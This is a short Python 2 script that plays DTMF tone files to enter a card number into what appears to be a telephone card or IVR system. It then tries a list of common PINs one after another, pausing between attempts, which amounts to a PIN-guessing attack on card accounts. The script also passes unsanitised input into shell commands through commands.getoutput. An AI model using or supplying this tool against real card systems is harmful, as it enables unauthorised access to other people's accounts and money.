#!/usr/bin/env python
import commands
from time import sleep
from sys import argv
def generate(number):
        if number == "#":
                commands.getoutput("play Dtmf-pound.wav")
        elif number == "*":
                commands.getoutput("play Dtmf-star.wav")
        else:
                commands.getoutput("play Dtmf-%s.wav" %number)

if __name__ == "__main__":
        raw_input("press enter when needed card info")
        for i in argv[1]:
                generate(i.strip())
        raw_input("press enter when pin needed")
        for i in ["1245","1234","9999","1111","3333","0000","5555","1212","6666","7777","1122","1004","1313","2000","8888","4444","4321","2222","2001","6969","1010","1245"]:
                for j in i:
                        generate(j.strip())
                raw_input("press enter when pin needed")

